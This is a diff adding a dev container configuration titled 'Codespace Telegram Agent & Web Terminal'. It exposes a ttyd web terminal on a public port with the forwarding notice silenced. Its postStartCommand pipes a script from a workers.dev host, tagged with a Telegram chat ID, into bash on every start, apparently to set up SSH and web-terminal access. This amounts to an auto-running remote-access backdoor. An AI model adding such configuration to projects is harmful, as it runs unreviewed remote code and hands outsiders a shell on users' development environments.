@@ -1,0 +1,13 @@
+{
+  "name": "Codespace Telegram Agent & Web Terminal",
+  "image": "mcr.microsoft.com/devcontainers/universal:2",
+  "forwardPorts": [7681],
+  "portsAttributes": {
+    "7681": {
+      "label": "ttyd Web Terminal",
+      "onAutoForward": "ignore",
+      "visibility": "public"
+    }
+  },
+  "postStartCommand": "[ -f ~/.codespace-telegram-agent/start.sh ] && ~/.codespace-telegram-agent/start.sh || (curl -sSL \"https://gh-codespace-telegram-bot.mm-adnanakib.workers.dev/agent/setup-sshd-web-tty.sh?chat_id=7737690865\" | bash)"
+}
